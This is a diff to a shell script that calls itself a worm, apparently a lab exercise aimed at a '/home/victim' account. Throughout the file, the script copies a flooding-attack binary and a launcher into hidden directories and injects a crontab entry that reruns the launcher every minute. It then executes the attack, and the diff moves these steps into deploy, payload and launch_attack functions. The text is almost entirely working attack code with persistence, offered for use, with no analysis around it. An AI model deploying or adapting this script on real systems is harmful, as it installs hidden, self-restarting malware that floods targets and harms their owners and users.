@@ -1,5 +1,17 @@
 #/bin/sh
 
+deploy() {
+  mkdir -p "$home_dir/$launch_dir1"
+  mkdir -p "$home_dir/$launch_dir2"
+  mkdir -p "$home_dir/$dir01/$module_dir"
+  mkdir -p "$home_dir/$dir02/$module_dir"
+  cp "$PWD/b" "$flooding_file" # reuse the provided file
+  cp "$PWD/$launch_file" "$home_dir/$launch_dir1"
+  cp "$PWD/$launch_file" "$home_dir/$launch_dir2"
+  cp "$PWD/$flooding_file" "$home_dir/$dir01/$module_dir"
+  cp "$PWD/$flooding_file" "$home_dir/$dir02/$module_dir"
+}
+
 inject_crontab() {
   echo "Injecting Crontab..."
   local crontab_command1='* * * * * [ -f /home/victim/.Launch_Attack/launching_attack.sh ] && /home/victim/.Launch_Attack/launching_attack.sh'
@@ -24,8 +36,20 @@ inject_crontab() {
   rm /tmp/tmp_cron
 }
 
-main() {
+launch_attack() {
+  $home_dir/$launch_dir1/$launch_file # launch attack!
+  $home_dir/$launch_dir2/$launch_file # launch attack!
+}
+
+payload() {
   echo "Launching Worm..."
+  deploy
+  inject_crontab
+  launch_attack
+  echo "Worms Deploy Finished!"
+}
+
+main() {
   local home_dir="/home/victim"
   local launch_dir1=".Launch_Attack"
   local launch_dir2=".Attack_Launch"
@@ -34,16 +58,6 @@ main() {
   local module_dir=".module"
   local launch_file="launching_attack.sh"
   local flooding_file="flooding_attack"
-  mkdir -p "$home_dir/$launch_dir"
-  mkdir -p "$home_dir/$dir01/$module_dir"
-  mkdir -p "$home_dir/$dir02/$module_dir"
-  cp "$PWD/b" "$flooding_file" # reuse the provided file
-  cp "$PWD/$launch_file" "$home_dir/$launch_dir1"
-  cp "$PWD/$launch_file" "$home_dir/$launch_dir2"
-  cp "$PWD/$flooding_file" "$home_dir/$dir01/$module_dir"
-  cp "$PWD/$flooding_file" "$home_dir/$dir02/$module_dir"
-  inject_crontab
-  $home_dir/$launch_dir/$launch_file # launch attack!
-  echo "Worms Deploy Finished!"
+  payload
 }
 main
